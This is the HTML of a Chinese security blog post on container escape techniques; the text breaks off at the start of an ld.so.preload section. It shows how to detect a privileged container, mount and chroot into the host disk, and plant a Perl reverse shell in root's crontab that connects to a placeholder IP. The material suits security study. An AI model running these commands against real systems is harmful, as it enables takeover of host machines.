<!DOCTYPE html>
<html lang="en">
    <!-- title -->


    

<!-- keywords -->



<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="azraelxuemo">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="azraelxuemo">
    
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="">
    <meta name="description" content="前言容器逃逸技术没有一尘不变的，很多旧的方法会随着新的内核特性，新的标准而改变，同时新的标准也会带来新的逃逸思路，这篇文章可能称不上标题所说的all in one，实际环境也千变万化。希望这篇文章可以给大家带来思路，可能在某一天的容器环境里发现可以利用的点，然后escape。 危险的Capabilityprivileged实验环境配置1docker run -it --privileged ubu">
<meta property="og:type" content="article">
<meta property="og:title" content="容器逃逸 All in One">
<meta property="og:url" content="https://azraelxuemo.github.io/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="前言容器逃逸技术没有一尘不变的，很多旧的方法会随着新的内核特性，新的标准而改变，同时新的标准也会带来新的逃逸思路，这篇文章可能称不上标题所说的all in one，实际环境也千变万化。希望这篇文章可以给大家带来思路，可能在某一天的容器环境里发现可以利用的点，然后escape。 危险的Capabilityprivileged实验环境配置1docker run -it --privileged ubu">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786457-8873cbd8-3466-4641-8d6e-c4ef49e85558.png#averageHue=%23191614&clientId=ubafe9d16-78e9-4&from=paste&id=u9a591fd9&originHeight=154&originWidth=3836&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u616c9640-dc45-4cbb-a8ee-b87f1dbf386&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786434-feaae7e2-3a0e-4847-92b5-405557d64525.png#averageHue=%23492922&clientId=ubafe9d16-78e9-4&from=paste&id=u0dd6bd00&originHeight=190&originWidth=3840&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u5484b209-1229-46d2-8c30-9f0c3a3cfcb&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786452-ec62f4db-9544-47e7-af99-b6c59941abf4.png#averageHue=%23070905&clientId=ubafe9d16-78e9-4&from=paste&id=ub4be4357&originHeight=134&originWidth=2712&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=udf244725-af22-477a-adb8-461389e3fd6&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786522-700f6053-ce49-44d7-adc2-f81b637dc7a8.png#averageHue=%23040404&clientId=ubafe9d16-78e9-4&from=paste&id=u05a1ee1c&originHeight=152&originWidth=702&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u9896dca2-5c4b-41db-950d-7bc9f9b3345&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786496-9edb21af-cc6e-409a-920d-8f71b7c9f333.png#averageHue=%23050505&clientId=ubafe9d16-78e9-4&from=paste&id=u8122ed78&originHeight=1096&originWidth=1656&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u0abd4a80-b81e-490f-9dd3-646e8750e54&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049787119-098de410-5f03-42cf-ad40-843ddfc73fe4.png#averageHue=%23050504&clientId=ubafe9d16-78e9-4&from=paste&id=uabdcd8cc&originHeight=116&originWidth=2858&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ue4c954cf-4e39-47c1-a3df-391f65ea31f&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049787334-5d839018-e272-4a19-8591-abd2bf136f45.png#averageHue=%23050504&clientId=ubafe9d16-78e9-4&from=paste&id=u6807a7ba&originHeight=148&originWidth=1200&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ube4ea2e6-f663-4d58-8235-7a3ade2fe56&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049787510-a82fb9aa-b22b-4a53-bec6-7f4148b6aa19.png#averageHue=%23441c14&clientId=ubafe9d16-78e9-4&from=paste&id=u367a1021&originHeight=184&originWidth=3790&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ucc9d04ee-7cf2-4c39-8c16-9cf9cfe7c49&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049787582-bf291ae8-d773-45e4-8792-6b733ee36fb5.png#averageHue=%23060604&clientId=ubafe9d16-78e9-4&from=paste&id=u1648bedc&originHeight=150&originWidth=798&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u06f7d773-6bf9-46ed-9cbd-da70959f896&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788286-024ecab8-b796-4770-bb22-73a852734502.png#averageHue=%23171614&clientId=ubafe9d16-78e9-4&from=paste&id=ucd3a0bd2&originHeight=1094&originWidth=1764&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u04f5c875-9070-4642-b875-9af1e471259&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788304-09dd0156-3f74-4a71-ac3f-42c8730ddf75.png#averageHue=%23050504&clientId=ubafe9d16-78e9-4&from=paste&id=u822ddf5a&originHeight=176&originWidth=3138&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ubb997d29-d7ad-4137-befc-187380a4b2f&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788315-2d20fc6d-b4d2-45a0-9d26-b90537595648.png#averageHue=%231a1715&clientId=ubafe9d16-78e9-4&from=paste&id=u69c696b5&originHeight=226&originWidth=3840&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=udd180f9f-f364-40e8-a3db-9071fc7c1e4&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788288-cf6e137a-9c33-4381-9be6-364fdf2e7b25.png#averageHue=%23050504&clientId=ubafe9d16-78e9-4&from=paste&id=uc36dadeb&originHeight=410&originWidth=1874&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uf2dc907c-cd12-4f92-88b2-2a450725506&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049788431-8e1e0f2e-70bf-44ee-98ee-bc95c015a728.png#averageHue=%23040404&clientId=ubafe9d16-78e9-4&from=paste&id=u0a9a0ed8&originHeight=1168&originWidth=1388&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u393faba1-bad0-497c-8de7-6254389a406&title=">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660548642077-f9b6bd41-47c2-4c3f-a2f0-b96b4acfb371.png#averageHue=%231e1e1d&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=209&id=ISUDI&originHeight=522&originWidth=2104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101049&status=error&style=none&taskId=uc950534b-649b-475d-af02-40180d51451&title=&width=841.6">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660548642014-89cac487-3b23-4757-8d30-84d10171ab05.png#averageHue=%23201e1d&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=153&id=ay71F&originHeight=383&originWidth=2128&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81434&status=error&style=none&taskId=u833ac6fb-ece2-4799-9074-4a0853109a4&title=&width=851.2">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660549882070-787d0911-7ebf-49c7-9095-a5693bfee68d.png#averageHue=%23262524&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=44&id=GslyB&originHeight=109&originWidth=3025&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35295&status=error&style=none&taskId=u572df5a7-2fd9-4ac7-a7ca-82003b3606a&title=&width=1210">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660550282085-a2bb42fd-35ba-41af-8718-81347ecd348b.png#averageHue=%23333126&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=111&id=nMQYa&originHeight=278&originWidth=3021&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113365&status=error&style=none&taskId=ua9419edb-f378-4b93-9d6a-17f696a5053&title=&width=1208.4">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660555518991-58ca570c-b5a7-4b9d-b495-e2b5cd53c075.png#averageHue=%231f1e1d&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=184&id=Y98G6&originHeight=460&originWidth=1781&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63014&status=error&style=none&taskId=uadc3b896-a36c-4fc9-b417-fcc9a3c9b2a&title=&width=712.4">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660555581978-3eb9a7f7-3551-4b33-a7e3-0c55d7104498.png#averageHue=%2323201f&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=81&id=V14P0&originHeight=202&originWidth=1653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34430&status=error&style=none&taskId=u4430c275-8548-4def-aa8b-477ffdaca9a&title=&width=661.2">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660555920523-903aee8a-3975-416e-8f11-02d8235a1280.png#averageHue=%23edefdb&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=52&id=WKrIi&originHeight=130&originWidth=1320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22077&status=error&style=none&taskId=u9b7eca85-67b5-4368-a4d7-99828afa453&title=&width=528">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558443588-1076a4ca-ef6f-49d8-ae57-d4afd97e0acf.png#averageHue=%231c1c1c&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=547&id=VjEwK&originHeight=1368&originWidth=1712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67200&status=error&style=none&taskId=uf55b623c-e57c-4a49-af1d-7328b88250e&title=&width=684.8">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558510775-57e1112e-0029-4a3b-a934-82f33f119320.png#averageHue=%231f1e1d&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=196&id=sIDxx&originHeight=489&originWidth=2217&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67680&status=error&style=none&taskId=u3a71a2ff-76a2-4c1b-a8b9-9195dbbbefa&title=&width=886.8">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558540070-2f737447-42c5-4bd7-a10e-d73b3f4a706c.png#averageHue=%232f2c25&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=78&id=yRVGj&originHeight=194&originWidth=2302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51093&status=error&style=none&taskId=u7bade40e-85b9-4a6b-9c75-7ba99b74cee&title=&width=920.8">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558567612-6e3f1e91-6a33-44a0-bf5e-383c9155a9ef.png#averageHue=%2322201f&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=112&id=MiZw5&originHeight=281&originWidth=1810&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45177&status=error&style=none&taskId=u8d81c025-f192-4b39-aba8-5135be402ed&title=&width=724">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558601491-9e8c4aaa-fa09-4434-bdc3-71b0ea0d0b2c.png#averageHue=%231d1c1c&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=551&id=pT0Qc&originHeight=1377&originWidth=1944&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95006&status=error&style=none&taskId=uf1eeda53-06f0-4973-b4c8-a8a18c6cf50&title=&width=777.6">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1659411329896-0caa3c7c-f851-406d-acd8-6ef92b71eeff.png#averageHue=%231e1d1d&clientId=u83ff2227-abf5-4&from=paste&height=134&id=ud0f67795&originHeight=334&originWidth=2186&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31238&status=done&style=none&taskId=ue9c1c063-2c98-4fc1-ad31-f1bc8c55321&title=&width=874.4">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/29417415/1659411538976-16b44784-0772-46a3-9b7b-743b1887874d.png#averageHue=%23212121&clientId=u83ff2227-abf5-4&errorMessage=unknown%20error&from=paste&height=124&id=u0a04ec1d&originHeight=310&originWidth=2141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31353&status=error&style=none&taskId=u2c23fb71-e413-4ccc-bea7-5324be2cec2&title=&width=856.4">
<meta property="article:published_time" content="2023-11-13T05:51:34.000Z">
<meta property="article:modified_time" content="2023-11-28T14:31:08.414Z">
<meta property="article:author" content="azraelxuemo">
<meta property="article:tag" content="云安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1700049786457-8873cbd8-3466-4641-8d6e-c4ef49e85558.png#averageHue=%23191614&clientId=ubafe9d16-78e9-4&from=paste&id=u9a591fd9&originHeight=154&originWidth=3836&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u616c9640-dc45-4cbb-a8ee-b87f1dbf386&title=">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/favicon.ico">
    
    <title>容器逃逸 All in One · azraelxuemo&#39;s Studio</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
    <link rel="stylesheet" href="/css/dark.css">
    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
    <!-- Google tag (gtag.js) -->
    
    <meta name="google-site-verification" content="H6aKQuxpb-48ib1oWUxq1rLD8nqbxENx7uRUj7p_E2A" />
<meta name="generator" content="Hexo 7.0.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu">
        
            
                <div style="padding-left: 1px;">&#xe775;</div>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>azraelxuemo's Studio.</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">azraelxuemo&#39;s Studio.</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">容器逃逸 All in One</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden">
        
        
            <div>&#xe639;</div>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
    
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                容器逃逸 All in One
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
    
        <a class="post-tag" href="javascript:void(0);" data-tags="云安全">云安全</a>
    
</div>

                
                <!-- 文章字数统计 -->
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2023/11/13</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>容器逃逸技术没有一尘不变的，很多旧的方法会随着新的内核特性，新的标准而改变，同时新的标准也会带来新的逃逸思路，这篇文章可能称不上标题所说的all in one，实际环境也千变万化。希望这篇文章可以给大家带来思路，可能在某一天的容器环境里发现可以利用的点，然后escape。</p>
<h1 id="危险的Capability"><a href="#危险的Capability" class="headerlink" title="危险的Capability"></a><strong>危险的C</strong>apability</h1><h2 id="privileged"><a href="#privileged" class="headerlink" title="privileged"></a><strong>privileged</strong></h2><h3 id="实验环境配置"><a href="#实验环境配置" class="headerlink" title="实验环境配置"></a><strong>实验环境配置</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged ubuntu:18.04</span><br></pre></td></tr></table></figure>
<h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a><strong>实际利用</strong></h3><p>如果查看CapEff为0000003fffffffff代表为特权容器，可以逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/status|grep CapEff</span><br><span class="line">CapEff:	0000003fffffffff</span><br></pre></td></tr></table></figure>
<p>逃逸方法，挂载宿主机根目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l|grep Linux</span><br><span class="line">mkdir /host</span><br><span class="line">mount /dev/vda1 /host</span><br><span class="line">chroot /host</span><br></pre></td></tr></table></figure>
<p>这个时候只是文件系统层面逃逸，还没有彻底逃逸,需要用到接下来的方法</p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><strong>计划任务</strong></h4><h5 id="var-spool-cron-crontabs-适用于ubuntu-debain"><a href="#var-spool-cron-crontabs-适用于ubuntu-debain" class="headerlink" title="&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 适用于ubuntu debain"></a>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 适用于ubuntu debain</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>
<p>如果目录存在，代表我们可以写一个crontab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $&#x27;*/1 * * * * perl -e \&#x27;use Socket;$i=&quot;ip&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27; &gt;&gt; /var/spool/cron/crontabs/root</span><br><span class="line">chmod 600 /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
<p>然后就是彻底逃逸了</p>
<h5 id="var-spool-cron-适用于centos"><a href="#var-spool-cron-适用于centos" class="headerlink" title="&#x2F;var&#x2F;spool&#x2F;cron 适用于centos"></a>&#x2F;var&#x2F;spool&#x2F;cron 适用于centos</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /var/spool/cron/</span><br></pre></td></tr></table></figure>
<p>如果目录存在，代表我们可以写一个crontab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $&#x27;*/1 * * * * perl -e \&#x27;use Socket;$i=&quot;ip&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27; &gt;&gt; /var/spool/cron/root</span><br><span class="line">chmod 600 /var/spool/cron/root</span><br></pre></td></tr></table></figure>
<h4 id="ld-so-preload"><a href="#ld-so-preload" class="headerlink" title="ld.so.preload"></a>ld.so.preload</h4><p>下面脚本为我自己编写，在实际测试中也可以用来做ld劫持，可以达到无感知劫持的效果,这里remove就是防止之后的所有进程都去加载这个so，实际我们加载一次就好了，如果需要可以重新上传</p>
